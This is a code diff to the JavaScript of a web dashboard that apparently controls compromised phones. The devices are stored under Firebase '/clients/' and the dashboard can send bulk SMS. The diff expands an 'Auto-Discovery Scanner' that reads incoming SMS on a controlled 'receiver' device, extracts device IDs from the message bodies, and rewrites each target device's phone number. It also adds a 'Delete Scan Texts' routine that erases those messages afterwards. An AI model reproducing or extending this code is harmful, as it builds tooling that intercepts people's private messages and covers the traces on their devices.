@@ -2579,10 +2579,10 @@ function renderTab(silent = false) {
             <div class="detail-grid">
                 <div class="detail-box">
                     <h3>📱 Identity</h3>
-                    <div class="detail-row"><span class="d-key">Device ID</span><span class="d-val" style="display:flex;align-items:center;gap:8px">${esc(d._id)}<div id="det-status-dot" class="d-status ${d.status?'on':'off'}" style="position:relative; width:10px; height:10px; border:none; border-radius:50%;" title="${d.status?'Online':'Offline'}"></div></span></div>
+                    <div class="detail-row"><span class="d-key">Device ID</span><span class="d-val" style="display:flex;align-items:center;gap:8px;cursor:pointer" onclick="copyToClip('${d._id}', this)">${esc(d._id)}<div id="det-status-dot" class="d-status ${d.status?'on':'off'}" style="position:relative; width:10px; height:10px; border:none; border-radius:50%;" title="${d.status?'Online':'Offline'}"></div></span></div>
                     <div class="detail-row"><span class="d-key">Phone No.</span>
                         <span class="d-val v-cyan" style="display:flex;align-items:center;gap:8px">
-                            ${esc(d.customPh || d.mobNo || 'Unknown')}
+                            <span style="cursor:pointer" onclick="event.stopPropagation();copyToClip('${(d.customPh || d.mobNo || '').replace(/'/g, "\\'")}', this)">${esc(d.customPh || d.mobNo || 'Unknown')}</span>
                             ${(window.CAN_EDIT_PHONE && d.customPh) ? '<span style="display:inline-flex;align-items:center;justify-content:center;width:16px;height:16px;background:var(--cyan);color:#000;border-radius:4px;font-size:0.75rem;cursor:help;font-weight:900;" title="Manually Edited">M</span>' : ''}
                             ${window.CAN_EDIT_PHONE ? `<button class="d-edit" style="opacity:1;position:relative" onclick="editPhone('${d._src}','${d._id}')" title="Edit Number">✏️</button>` : ''}
                         </span>
@@ -3874,21 +3874,68 @@ async function execBulkSMS() {
 }
 
 // ═══ AUTO-DISCOVERY SCANNER ═══
+let _scanCtx = null; // Persistent scan context for Rescan & Delete
+
 function startDiscoveryScan(receiverId, selectedDevices) {
     const rDev = devices.find(d => d._id === receiverId);
     if (!rDev) return customAlert('Discovery Failed', `Receiver device ${receiverId} not found in your connected databases.`, 'error');
     
-    const durationMs = 60 * 1000; // 60 seconds
-    const intervalMs = 10 * 1000; // 10 seconds
-    const startTime = Date.now();
-    let matchesFound = 0;
+    // Initialize fresh scan context
+    _scanCtx = {
+        receiverId,
+        rDev,
+        selectedDevices,
+        discoveredMsgs: [],
+        processedKeys: new Set(),
+        matchesFound: 0,
+        isScanning: false
+    };
     
-    customAlert('Scanner Armed', `Auto-Discovery Scanner is running in the background for 60 seconds.\n\nMonitoring receiver: ${receiverId}\nLooking for: ${selectedDevices.length} devices.`, 'success');
+    _runScanPass(false);
+}
+
+async function _runScanPass(isRescan) {
+    if (!_scanCtx || _scanCtx.isScanning) return;
+    _scanCtx.isScanning = true;
+    
+    const { rDev, selectedDevices } = _scanCtx;
+    const durationMs = 60 * 1000;
+    const intervalMs = 10 * 1000;
+    const startTime = Date.now();
+    let passMatches = 0;
+    
+    // Show scanning-in-progress popup
+    const scanLabel = isRescan ? 'Rescanning' : 'Scanner Armed';
+    customAlert(scanLabel, `<div id="scanStatusContent">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+            <div class="scan-spinner" style="width:18px;height:18px;border:2px solid rgba(0,240,255,0.2);border-top-color:var(--cyan);border-radius:50%;animation:spin 0.8s linear infinite;"></div>
+            <span style="color:var(--cyan);font-weight:600;">Scanning... <span id="scanTimer">60</span>s remaining</span>
+        </div>
+        <div style="color:var(--text-sec);font-size:0.85rem;">Monitoring receiver: ${_scanCtx.receiverId}<br>Looking for: ${selectedDevices.length} devices</div>
+        ${isRescan && _scanCtx.matchesFound > 0 ? `<div style="margin-top:8px;color:var(--text-muted);font-size:0.8rem;">Previously discovered: ${_scanCtx.matchesFound} numbers</div>` : ''}
+    </div>`, 'success');
+    
+    // Add spin keyframe if not already present
+    if (!document.getElementById('scanSpinStyle')) {
+        const style = document.createElement('style');
+        style.id = 'scanSpinStyle';
+        style.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
+        document.head.appendChild(style);
+    }
+    
+    // Countdown timer
+    const timerInterval = setInterval(() => {
+        const remaining = Math.max(0, Math.ceil((durationMs - (Date.now() - startTime)) / 1000));
+        const el = document.getElementById('scanTimer');
+        if (el) el.textContent = remaining;
+    }, 1000);
     
     const scanInterval = setInterval(async () => {
         if (Date.now() - startTime > durationMs) {
             clearInterval(scanInterval);
-            customAlert('Scanner Complete', `Auto-Discovery finished.\nTotal numbers linked: ${matchesFound}`, 'success');
+            clearInterval(timerInterval);
+            _scanCtx.isScanning = false;
+            _showScanResults(passMatches, isRescan);
             return;
         }
         
@@ -3907,7 +3954,6 @@ function startDiscoveryScan(receiverId, selectedDevices) {
         
         if (allMsgs.length === 0) return;
         
-        // Only look at incoming messages
         const incomingMsgs = allMsgs.filter(m => typeof m === 'object' && m !== null && m.type === 'incoming');
         
         for (const msg of incomingMsgs) {
@@ -3915,43 +3961,137 @@ function startDiscoveryScan(receiverId, selectedDevices) {
             const sender = msg.sender || msg.address || '';
             if (!body || !sender) continue;
             
-            // Extract 16-character hex ID
+            // Skip messages we already processed (prevents rescan duplicates)
+            const msgKey = `${msg._fbPath}::${msg._fbKey}`;
+            if (_scanCtx.processedKeys.has(msgKey)) continue;
+            
             const idMatch = body.match(/([a-f0-9]{16})/i);
             if (idMatch) {
                 const foundId = idMatch[1].toLowerCase();
                 const targetDev = selectedDevices.find(d => d._id === foundId);
                 
                 if (targetDev) {
-                    // Strip +91 from the incoming sender number
+                    // Mark as processed immediately
+                    _scanCtx.processedKeys.add(msgKey);
+                    
+                    // Track this message for Delete Scan Texts
+                    _scanCtx.discoveredMsgs.push({
+                        src: rDev._src,
+                        id: rDev._id,
+                        fbPath: msg._fbPath,
+                        fbKey: msg._fbKey,
+                        sender: sender,
+                        deviceId: foundId
+                    });
+                    
                     let cleanSender = sender;
                     if (cleanSender.startsWith('+91')) {
                         cleanSender = cleanSender.substring(3);
                     }
                     
-                    // Check if they already have a customPh. Strip +91 from that too just in case for a clean comparison.
                     let currentCustom = targetDev.customPh || '';
                     if (currentCustom.startsWith('+91')) currentCustom = currentCustom.substring(3);
                     
-                    // If the numbers don't match, overwrite it with the newly stripped number
                     if (currentCustom !== cleanSender) {
                         targetDev.customPh = cleanSender;
-                        matchesFound++;
+                        passMatches++;
+                        _scanCtx.matchesFound++;
                         
-                        // Save to Firebase silently
-                    const tSrc = SOURCES.find(s => s.key === targetDev._src);
-                    const tToken = tSrc ? await getAuthToken(tSrc) : null;
-                    const tAuth = tToken ? `?auth=${tToken}` : '';
-                    try {
-                        await proxyFirebase(targetDev._src, targetDev._id, `/clients/${targetDev._id}/customPh.json`, 'PUT', sender);
-                    } catch(e) {}
-                    
-                    filterDevs(); // update UI if visible
+                        try {
+                            await proxyFirebase(targetDev._src, targetDev._id, `/clients/${targetDev._id}/customPh.json`, 'PUT', cleanSender);
+                        } catch(e) {}
+                        
+                        filterDevs();
+                    }
                 }
-            } // Close if (targetDev)
-        } // Close if (idMatch)
-    } // Close for loop
+            }
+        }
     }, intervalMs);
 }
+
+function _showScanResults(passMatches, isRescan) {
+    const totalMatches = _scanCtx.matchesFound;
+    const totalTracked = _scanCtx.discoveredMsgs.length;
+    const hasTracked = totalTracked > 0;
+    
+    const title = isRescan ? 'Rescan Complete' : 'Scanner Complete';
+    const summary = isRescan 
+        ? `New numbers discovered: <span style="color:var(--cyan);font-weight:700;">${passMatches}</span><br>Total numbers linked: <span style="color:var(--cyan);font-weight:700;">${totalMatches}</span>`
+        : `Numbers discovered: <span style="color:var(--cyan);font-weight:700;">${totalMatches}</span>`;
+    
+    const html = `
+        <div style="margin-bottom:16px;">
+            <div style="font-size:0.95rem;color:var(--text-sec);line-height:1.8;">${summary}</div>
+            ${hasTracked ? `<div style="font-size:0.8rem;color:var(--text-muted);margin-top:4px;">Scan texts tracked: ${totalTracked}</div>` : ''}
+        </div>
+        <div id="scanActionBtns" style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap;">
+            <button onclick="_startRescan()" id="rescanBtn" style="padding:8px 16px;border-radius:8px;border:1px solid var(--cyan);background:rgba(0,240,255,0.08);color:var(--cyan);font-weight:600;cursor:pointer;font-size:0.85rem;display:flex;align-items:center;gap:6px;transition:all 0.2s;">
+                🔄 Rescan
+            </button>
+            ${hasTracked ? `<button onclick="_deleteScanTexts()" id="deleteScanBtn" style="padding:8px 16px;border-radius:8px;border:1px solid var(--red);background:rgba(239,68,68,0.08);color:var(--red);font-weight:600;cursor:pointer;font-size:0.85rem;display:flex;align-items:center;gap:6px;transition:all 0.2s;">
+                🗑️ Delete Scan Texts
+            </button>` : ''}
+        </div>
+        <div id="scanDeleteStatus" style="margin-top:12px;"></div>
+    `;
+    
+    customAlert(title, html, 'success');
+}
+
+function _startRescan() {
+    if (!_scanCtx || _scanCtx.isScanning) return;
+    _runScanPass(true);
+}
+
+async function _deleteScanTexts() {
+    if (!_scanCtx || _scanCtx.discoveredMsgs.length === 0) return;
+    
+    const msgs = _scanCtx.discoveredMsgs;
+    const total = msgs.length;
+    
+    // Disable both buttons during deletion
+    const deleteBtn = document.getElementById('deleteScanBtn');
+    const rescanBtn = document.getElementById('rescanBtn');
+    if (deleteBtn) { deleteBtn.disabled = true; deleteBtn.style.opacity = '0.5'; deleteBtn.style.cursor = 'not-allowed'; }
+    if (rescanBtn) { rescanBtn.disabled = true; rescanBtn.style.opacity = '0.5'; rescanBtn.style.cursor = 'not-allowed'; }
+    
+    const statusEl = document.getElementById('scanDeleteStatus');
+    let deleted = 0;
+    let failed = 0;
+    
+    for (let i = 0; i < msgs.length; i++) {
+        const m = msgs[i];
+        if (statusEl) {
+            statusEl.innerHTML = `<div style="display:flex;align-items:center;gap:8px;justify-content:center;">
+                <div style="width:14px;height:14px;border:2px solid rgba(239,68,68,0.2);border-top-color:var(--red);border-radius:50%;animation:spin 0.6s linear infinite;"></div>
+                <span style="color:var(--red);font-size:0.85rem;font-weight:600;">Deleting ${i + 1} of ${total}...</span>
+            </div>`;
+        }
+        
+        try {
+            const r = await fetch(`/api/messages/${m.src}/${m.id}`, {
+                method: 'DELETE',
+                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${localStorage.getItem('token')}` },
+                body: JSON.stringify({ fbPath: m.fbPath, fbKey: m.fbKey })
+            });
+            if (r.ok) deleted++;
+            else failed++;
+        } catch(e) { failed++; }
+    }
+    
+    // Clear tracked messages since they're deleted
+    _scanCtx.discoveredMsgs = [];
+    
+    // Update status
+    if (statusEl) {
+        statusEl.innerHTML = `<div style="color:var(--green);font-size:0.85rem;font-weight:600;margin-top:4px;">✓ Deleted ${deleted} scan text${deleted !== 1 ? 's' : ''}${failed > 0 ? ` <span style="color:var(--red);">(${failed} failed)</span>` : ''}</div>`;
+    }
+    
+    // Hide delete button (nothing left to delete), re-enable rescan
+    if (deleteBtn) deleteBtn.style.display = 'none';
+    if (rescanBtn) { rescanBtn.disabled = false; rescanBtn.style.opacity = '1'; rescanBtn.style.cursor = 'pointer'; }
+}
+
 
 // ═══ SIDEBAR RESIZER ═══
 const resizer = document.getElementById('dragResizer');
